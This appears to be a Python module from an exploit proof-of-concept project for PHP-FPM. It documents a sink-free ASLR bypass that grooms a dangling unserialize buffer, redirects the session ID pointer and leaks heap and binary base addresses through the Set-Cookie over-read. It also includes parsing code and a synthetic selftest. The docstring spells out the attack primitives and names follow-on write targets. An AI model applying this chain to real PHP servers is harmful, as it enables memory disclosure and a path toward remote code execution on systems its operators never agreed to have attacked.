#!/usr/bin/env python3
# INDEX: sink-free php-fpm set-cookie over-read -> chunk K + binbase | fpm | survivable arm + send_cookie, use_only_cookies
"""Sink-free php-fpm ASLR defeat via the session-cookie over-read (VAL-REDIRECT).

Capability: recover the ZendMM chunk base K and the php-fpm PIE binbase with NO
app unserialize sink, over pure HTTP, on php-fpm. The over-read site is core and
app-agnostic:

    ext/session/session.c (php_session_send_cookie):
        e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)))

fired on the normal `Set-Cookie: PHPSESSID=` path of any endpoint that
session_start()s (on the reference target: `/`, `/index.php`). The channel differs from the Apache
forged-len window (primitives/read_leak/apache_cookie_window_leak): on fpm an
inflated len is DEAD (var_push can only deposit a chunk POINTER, never a small
int; a pointer-as-len ~127 TB walks php_url_encode off the mapping -> SIGSEGV,
502, no cookie). The working fpm variant is VAL-REDIRECT: leave the real small
`len` (~26-40) intact and point PS(id)->val (ZSTR_VAL == &PS(id)->val, the
zend_string at +0x18) at a chosen chunk address; php_url_encode then reads `len`
bytes from there into the cookie. Across shots the aimed address is swept
(cookie-diff gradient) to disclose chunk-interior self-references (-> K) and an
object handlers / HashTable pDestructor word (-> binbase).

Composition (sink-free, pure HTTP), each piece an existing primitive:
  * ARM  survivable script-level session_start() OOM leaves BG(unserialize)
         dangling (php_execute_script's zend_first_try absorbs the OOM; worker
         survives, unlike the body-parse OOM's exit70). See primitives/groom/
         session_decode_dangle + upload_progress_cookie_seed; transport is plain
         Content-Length (nginx de-chunks TE, so Apache's chunked-TE body does not
         port) with fpm worker-pinning (primitives/groom/worker_pin / chains/
         fpm_pool) across the pinned seat->redirect->send_cookie sequence.
  * WRITE K-free arbitrary-dest var_push (chains, d-preserving groom): forge the
         reused dangle's E->used_slots so the next var_push stores a chunk pointer
         at PS(id)+0x18. Chunk-relative, needs no prior leak (breaks the leak's
         own circularity).
  * READ  send_cookie emits the over-read bytes; cookie_from_headers extracts
         them, parse_window() below derives {chunk, binbase}.

What this disclosure gives and does NOT give: K + binbase (a genuine sink-free
ASLR defeat). It does NOT give ps_files / AIM_U -- ps_files has no inbound heap
pointer (referenced only via PS(mod_data) in .bss) and AIM_U is a K-independent
groom difference, so no over-read can produce it (see .claude context leak
verdict). The K+binbase it yields is exactly what an offset-free-by-name dispatch
or a .bss auto_append write (binbase + core_globals field offsets) consumes.

Status: the parse half is offline-verified here (`--selftest`, reconstructing the
K+binbase recovery that the retired write_to_leak.py selftest proved); the
VAL-REDIRECT write is verified over HTTP (d-preserving groom); the full live
over-read end-to-end (arm -> redirect -> send_cookie -> window) is the open step
-- the expensive per-shot arm (unlink+rebuild of the arm session) was never run
as a standing cookie-leak lab. Live run: the reference target via its nginx front
127.0.0.1:8080, Host ref.local, offsets BUILTIN_OFFSETS["8.3.26-fpm"];
/proc/<worker>/maps (readable as root in the fpm worker; /proc/pid/mem is NOT --
no CAP_SYS_PTRACE) cross-checks the
derived chunk/binbase.

Pure stdlib, python3 -I safe.
"""
from __future__ import annotations

import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.read_leak.carrier_base_locate import (  # noqa: E402
    self_locate, chunk_base, CHUNK_MASK)

PTR_LO = 0x100000000000
PTR_HI = 0x800000000000
PAGE = 0x1000
# zend_string layout: {gc(8), h(8), len(8), val[]}; ZSTR_VAL is at +0x18.
ZSTR_VAL_OFF = 0x18
# PS(id)->val is read with the id's real (small) length; keep the redirect window
# within one page so php_url_encode never leaves the mapping.
MAX_WINDOW = 0x100


def val_redirect_dest(ps_id_addr):
    """Absolute address the var_push must write (the ZSTR_VAL field of PS(id))."""
    return ps_id_addr + ZSTR_VAL_OFF


def probe_addr(chunk_guess, page_off):
    """A chunk-relative probe target to aim PS(id)->val at for one gradient shot."""
    return (chunk_guess & ~CHUNK_MASK) + page_off


def _isptr(v):
    return PTR_LO <= v < PTR_HI


def parse_window(windows, off, min_chunk_votes=1):
    """Derive {chunk, binbase} from one or more disclosed over-read windows.

    `windows` is a list of raw byte strings (one per gradient shot) or a single
    bytes. K: every chunk-interior qword votes (ptr & ~0x1FFFFF); a window >=0x48
    bytes additionally runs carrier_base_locate.self_locate on its 0x40-stride
    self-references for a page-exact carrier base. binbase: any qword V with
    (V - off["zval_ptr_dtor"]) PIE-range page-aligned (a disclosed &zval_ptr_dtor,
    e.g. a HashTable pDestructor the redirect aimed at). Returns binbase=None when
    no image word was disclosed (chunk-only ignition)."""
    if isinstance(windows, (bytes, bytearray)):
        windows = [windows]
    blob = b"".join(bytes(w) for w in windows)
    if len(blob) < 8:
        raise ValueError("no window bytes")

    # --- chunk K ---
    votes = {}
    for o in range(0, len(blob) - 7, 8):
        v = struct.unpack_from("<Q", blob, o)[0]
        if _isptr(v):
            votes[v & ~CHUNK_MASK] = votes.get(v & ~CHUNK_MASK, 0) + 1
    chunk = None
    if votes:
        cand = max(votes, key=votes.get)
        if votes[cand] >= min_chunk_votes:
            chunk = cand
    # a wide self-referential window pins the carrier base exactly
    for w in windows:
        if len(w) >= 0x48:
            base, nv = self_locate(bytes(w), min_votes=3, ptr_lo=PTR_LO, ptr_hi=PTR_HI)
            if base is not None:
                chunk = chunk_base(base)
                break
    if chunk is None:
        raise ValueError("no chunk pointers in the window(s)")

    # --- binbase (best-effort) ---
    zpd = off.get("zval_ptr_dtor")
    binbase = None
    if zpd is not None:
        bb = {}
        for o in range(0, len(blob) - 7, 8):
            v = struct.unpack_from("<Q", blob, o)[0]
            if not _isptr(v):
                continue
            c = v - zpd
            if _isptr(c) and c % PAGE == 0:
                bb[c] = bb.get(c, 0) + 1
        if bb:
            binbase = max(bb, key=bb.get)
    return {"chunk": chunk, "binbase": binbase}


# ---- offline selftest: reconstruct the proven K+binbase recovery -------------
def _synth_windows(chunk, binbase, zval_ptr_dtor):
    """Two synthetic VAL-REDIRECT shots: (A) val aimed at a chunk-interior
    self-referential carrier run (0x40-stride, -> K via self_locate); (B) val
    aimed at a HashTable whose pDestructor == &zval_ptr_dtor (-> binbase)."""
    # Shot A: a 0x80-byte carrier slice with 0x40-stride self-references.
    a_base = chunk + 0x690d8
    A = bytearray(0x80)
    for o in range(0, 0x80 - 0x40, 8):
        struct.pack_into("<Q", A, o, a_base + o + 0x40)  # word(o) = base+o+0x40
    # Shot B: pDestructor word + a couple of chunk-interior neighbours.
    B = bytearray()
    B += struct.pack("<Q", binbase + zval_ptr_dtor)   # &zval_ptr_dtor
    B += struct.pack("<Q", chunk + 0x5b230)           # chunk-interior
    B += struct.pack("<Q", chunk + 0x5b240)
    return [bytes(A), bytes(B)]


def _selftest():
    off = {"zval_ptr_dtor": 0x57a790}
    chunk = 0x7f2a1ec00000
    binbase = 0x7f2a00000000
    got = parse_window(_synth_windows(chunk, binbase, off["zval_ptr_dtor"]), off)
    ok_c = got["chunk"] == chunk
    ok_b = got["binbase"] == binbase
    print(f"[selftest] chunk   {got['chunk']:#x}  expect {chunk:#x}  "
          f"{'OK' if ok_c else 'FAIL'}")
    print(f"[selftest] binbase {got['binbase'] and hex(got['binbase'])}  "
          f"expect {binbase:#x}  {'OK' if ok_b else 'FAIL'}")
    # chunk-only ignition: a single narrow window with one chunk pointer.
    narrow = struct.pack("<Q", chunk + 0x5c000) + b"/02BBBB"
    c2 = parse_window(narrow, off)
    ok_n = c2["chunk"] == chunk and c2["binbase"] is None
    print(f"[selftest] chunk-only  {c2['chunk']:#x} binbase {c2['binbase']}  "
          f"{'OK' if ok_n else 'FAIL'}")
    return 0 if (ok_c and ok_b and ok_n) else 1


def main(argv):
    import argparse
    ap = argparse.ArgumentParser(description="fpm session-cookie over-read "
                                 "VAL-REDIRECT leak -> chunk K + binbase")
    ap.add_argument("--selftest", action="store_true",
                    help="offline parse reconstruction (no lab)")
    a = ap.parse_args(argv)
    if a.selftest:
        return _selftest()
    ap.print_help()
    return 2


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
